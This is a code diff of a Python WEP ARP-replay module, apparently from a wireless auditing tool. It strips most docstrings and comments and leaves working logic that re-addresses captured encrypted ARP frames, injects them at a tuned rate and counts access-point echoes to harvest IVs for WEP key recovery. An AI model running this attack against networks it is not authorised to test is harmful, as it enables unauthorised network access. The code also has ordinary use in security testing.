@@ -68,43 +68,20 @@ class ArpReplayStats:
 
 
 class WepArpReplay:
-    """ARP-replay loop with patient candidate testing + per-second P&O rate.
+    """ARP-replay loop with patient candidate testing + per-second P&O rate."""
 
-    Each 1-second window injects ``rate`` packets (one big burst at the card's
-    full speed), then waits out the second. A **perturb-and-observe** step on
-    ``rate`` maximizes the real objective — IVs/s (≈ IVs captured per window) —
-    by stepping the rate, observing whether IVs/s rose or fell, and reversing on
-    a drop. Simple, and it lets the rate climb freely toward whatever the AP can
-    actually sustain (we make NO assumption about a low ceiling).
-    """
-
-    # P&O rate controller over 1s windows. Control var = pps (= packets/window);
-    # objective = IVs gained that second.
+    # P&O rate controller over 1s windows. objective = IVs gained that second.
     _WINDOW_S = 1.0
     _PO_STEP_PPS = 32.0
     _PO_START_PPS = 100.0
     _PO_MIN_PPS = 20.0
     _PO_MAX_PPS = 1000.0
-    # Relative improvement deadband — reverse only on a real drop, so window
-    # noise doesn't thrash the rate.
-    _PO_IMPROVE_EPS = 0.05
-    # EWMA smoothing of the per-window IVs/s before P&O acts on it. Damps the
-    # queue-drain transient (lowering the rate briefly SPIKES captured IVs/s as
-    # the AP's backlog flushes — raw, that fools P&O into "lower = better").
-    # ~0.3 keeps a recent-weighted ~3-window memory.
-    _IVS_EWMA_ALPHA = 0.3
-    # How long to keep testing one candidate before judging it (seconds). The
-    # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
-    _TRIAL_WINDOW = 2.5
-    # Echoes (AP rebroadcasts of our own replay) needed to call a candidate
-    # replayable. 1 is definitive — only the AP relaying our frame produces one.
-    _MIN_TRIAL_GAIN = 1
-    # A locked winner that yields nothing for this long is probably a stale
-    # association → ask fake-auth to re-auth (keep the seed) before giving up.
+    _PO_IMPROVE_EPS = 0.05  # Relative improvement deadband
+    _IVS_EWMA_ALPHA = 0.3   # EWMA smoothing of the per-window IVs/s before P&O acts on it.
+    _TRIAL_WINDOW = 2.5     # Time to keep testing one candidate before judging it (seconds).
+    _MIN_TRIAL_GAIN = 1     # Echoes needed to call a candidate replayable.
     _STALL_REAUTH_AFTER = 2.0
     _STALL_DEMOTE_AFTER = 6.0
-    # Forgive the blacklist periodically (earlier failures may have been
-    # "not associated yet" rather than "bad ARP").
     _FAILED_RETRY_COOLDOWN = 20.0
 
     def __init__(
@@ -121,18 +98,14 @@ class WepArpReplay:
         self.target = target
         self.bssid = target.bssid
         self.bssid_bytes = _str_to_mac(target.bssid)
-        # The associated STA we source replays from (the fake-auth MAC). A
-        # captured ARP's encrypted body is re-addressed under this MAC.
         self.source_mac = source_mac or (bytes([0x02]) + os.urandom(5))
         self.collector = collector
-        # Awaited right before a burst — authenticates lazily (returns True iff
-        # associated). We only call it once we actually have an ARP to send.
         self._ensure_associated = ensure_associated or _always_associated
         self._request_reauth = request_reauth or (lambda: None)
         self._log = log_callback or (lambda _m: None)
 
         self.stats = ArpReplayStats()
-        self.state = "idle"        # idle|waiting-auth|waiting-arp|testing|replaying|paused
+        self.state = "idle"   # idle|waiting-auth|waiting-arp|testing|replaying|paused
 
         self._active = False
         self._paused = False
@@ -145,11 +118,7 @@ class WepArpReplay:
         self._last_ivs_s = 0.0                # this window's RAW IVs/s
         self._ivs_ewma = -1.0                 # smoothed IVs/s (what P&O acts on)
 
-        # AP-echo correlation: _rx_cb bumps this when the AP rebroadcasts one of
-        # OUR replays (FromDS + broadcast DA + SA==source_mac). The verdict keys
-        # on echoes gained per trial — NOT the global IV count, which any other
-        # client's traffic inflates. _burst_window snapshots + diffs it.
-        self._echoes = 0
+        self._echoes = 0  # AP-echo correlation
 
         # Candidate under test/replay + its trial accounting.
         self._current: Optional[bytes] = None
@@ -210,16 +179,13 @@ class WepArpReplay:
 
     @property
     def target_pps(self) -> float:
-        """The P&O-chosen injection rate (the smooth controlled variable). Use
-        this for display, NOT stats.effective_pps — the latter is the per-cycle
-        MEASURED rate and jitters with USB/scheduling latency."""
+        """The P&O-chosen injection rate (the smooth controlled variable)."""
         return self._rate
 
     # ---- Candidate selection ------------------------------------------------
 
     def _next_candidate(self, candidates: List[bytes]) -> Optional[bytes]:
-        """First not-blacklisted candidate (winner handling is in the loop).
-        Periodically forgives the blacklist."""
+        """First not-blacklisted candidate (winner handling is in the loop)."""
         if self._failed and (time.time() - self._failed_at) > self._FAILED_RETRY_COOLDOWN:
             self._failed.clear()
         for cand in candidates:
@@ -235,10 +201,6 @@ class WepArpReplay:
         self._reauth_requested = False
         if cand is not self._winner:
             self.stats.candidates_tried += 1
-        # Group header (plain) — one per candidate trial; _judge closes it with a
-        # └─✓ (replaying) or └─╳ (couldn't replay) leaf. The byte-count lets
-        # the user see which captured lengths get tried vs. which actually
-        # replay — surfaces FCS-padded / mis-classified candidates.
         self._log(
             f"[green]ARP Replay:[/green] [white]Testing candidate packet "
             f"({len(cand)} B)…[/white]"
@@ -254,13 +216,7 @@ class WepArpReplay:
                     await asyncio.sleep(0.2)
                     continue
 
-                # Find an ARP to replay FIRST — only then is it worth
-                # authenticating (no eager fake-auth with nothing to send).
-                # A confirmed winner is replayed forever — WEP frames never
-                # expire, so don't drop it just because it aged out of the
-                # constantly-churning capture ring (our own replays make the AP
-                # rebroadcast, flooding the ring with fresh frames). Re-picking
-                # an evicted winner each cycle is what spammed the log.
+                # Find an ARP to replay FIRST.
                 if self._winner is not None:
                     self._current = self._winner
                 else:
@@ -273,7 +229,7 @@ class WepArpReplay:
                     if self._current is not cand:
                         self._begin_trial(cand)
 
-                # We have something to send — now (lazily) associate.
+                # We have something to send, now (lazily) associate.
                 if not await self._ensure_associated():
                     self._set_state("waiting-auth")
                     await asyncio.sleep(0.3)
@@ -288,13 +244,7 @@ class WepArpReplay:
 
     def _build_replay_frame(self, captured: bytes) -> Optional[bytes]:
         """Re-address a captured WEP ARP into a ToDS frame sourced from our
-        associated MAC, reusing its (cleartext-headed) encrypted body verbatim.
-
-        The 802.11 header is NOT encrypted, so swapping it doesn't disturb the
-        IV / ciphertext / ICV — the AP decrypts the body with the same key+IV,
-        sees a valid broadcast ARP from an associated STA (us), and relays it
-        with a fresh IV. Works for frames captured in EITHER direction.
-        """
+        associated MAC, reusing its (cleartext-headed) encrypted body verbatim."""
         if len(captured) < 28:
             return None
         fc0, fc1 = captured[0], captured[1]
@@ -321,17 +271,7 @@ class WepArpReplay:
     # ---- Echo oracle (RX callback) ------------------------------------------
 
     def _rx_cb(self, pkt) -> None:
-        """Count the AP echoing one of OUR replays — the "replayable" signal.
-
-        Pinned signature (the same correlation frag/chopchop use): Data +
-        FromDS + Protected, Addr1(DA)=broadcast, Addr3(SA)==our source_mac.
-        Our own injections are ToDS (FromDS=0) so they're excluded, and a
-        relayed client ARP carries the client's MAC as SA, not ours — so no
-        other station's traffic can be mistaken for our replay working. Gated on
-        active-and-not-paused: frag/chopchop share our source_mac, so a frag
-        relay (broadcast DA too) during a pause would otherwise bleed in. Runs
-        on every RX frame — keep it cheap.
-        """
+        """Count the AP echoing one of OUR replays — the "replayable" signal."""
         frame = pkt.raw
         if not self._active or self._paused or len(frame) < 22:
             return
@@ -350,10 +290,7 @@ class WepArpReplay:
 
     async def _burst_window(self, cand: bytes) -> int:
         """One 1-second window: blast ``rate`` packets at the card's full speed,
-        then sleep out the rest of the second while the AP's rebroadcasts land.
-        Returns the echoes we matched as OURS this window (the verdict signal);
-        the P&O objective — global IVs/s — is tracked separately in _ivs_ewma
-        from the collector's IV count."""
+        then sleep out the rest of the second while the AP's rebroadcasts land."""
         frame = self._build_replay_frame(cand)
         if frame is None:
             # Malformed capture — blacklist and move on.
@@ -375,9 +312,7 @@ class WepArpReplay:
                 logger.exception(f"[WEP-ARP] failed to send frame during burst (sent={sent})")
                 break
         send_dt = max(1e-3, time.time() - t0)   # burst only — the hardware cap
-        # Wait out the remainder of the 1s window (one big sleep — immune to
-        # Windows' ~15ms timer granularity). If the burst overran the second
-        # (rate beyond the card's reach), no sleep — the card's max IS our cap.
+        # Wait out the remainder of the 1s window
         await asyncio.sleep(max(0.0, self._WINDOW_S - send_dt))
         window_dt = max(1e-3, time.time() - t0)
         self.stats.cycles += 1
@@ -394,9 +329,7 @@ class WepArpReplay:
             raw_ivs_s if self._ivs_ewma < 0
             else a * raw_ivs_s + (1.0 - a) * self._ivs_ewma
         )
-        # The verdict keys on echoes (the AP rebroadcasting OUR frame), not the
-        # IV delta — that's what keeps another client's IVs from false-promoting
-        # a dud candidate. P&O still optimizes global IVs/s via _ivs_ewma above.
+        # The verdict keys on echoes, not the IV delta
         return self._echoes - echoes_before
 
     def _judge(self, gain: int) -> None:
@@ -409,8 +342,7 @@ class WepArpReplay:
                 self._stall_started = 0.0
                 self._reauth_requested = False
                 return
-            # Winner went quiet — likely we got de-associated. Give it a grace
-            # period, ask fake-auth to re-auth, and only demote if it stays dead.
+            # Winner went quiet, likely we got de-associated. Give grace period
             now = time.time()
             if self._stall_started == 0.0:
                 self._stall_started = now
@@ -425,8 +357,7 @@ class WepArpReplay:
                 self.stats.has_winner = False
             return
 
-        # Testing a candidate: it's replayable once the AP has echoed it at least
-        # _MIN_TRIAL_GAIN times; otherwise blacklist after the trial window.
+        # Testing a candidate: it's replayable once the AP has echoed it _MIN_TRIAL_GAIN.
         self._set_state("testing")
         if self._trial_gain >= self._MIN_TRIAL_GAIN:
             self._winner = self._current
@@ -451,12 +382,7 @@ class WepArpReplay:
             ))
 
     def _maybe_adjust_rate(self) -> None:
-        """Perturb-and-observe step, run once per 1s window — ONLY while
-        replaying a winner (else IVs/s isn't a clean function of our rate). Keep
-        the perturbation's direction if the SMOOTHED (EWMA) IVs/s beat the last
-        step's, else reverse; then step the rate. The rate walks toward more
-        IVs/s and dithers around the peak — wherever the AP actually tops out.
-        """
+        """Perturb-and-observe step, run once per 1s window"""
         if self.state != "replaying":
             # No steady signal → reset the baseline + smoothing for next time.
             self._po_prev_ivs_s = -1.0
@@ -483,9 +409,5 @@ class WepArpReplay:
             return
         self._last_state = state
         if state == "waiting-arp":
-            # We already suggested deauth/chop/frag at start — keep this terse.
             self._log("[green]ARP Replay:[/green] [white]waiting for ARP[/white]")
-        # "testing" is logged per-candidate in _begin_trial (the group header) —
-        # _set_state dedups, which would swallow each new candidate's header
-        # after the first. waiting-auth is silent (SECURITY panel covers it).
 
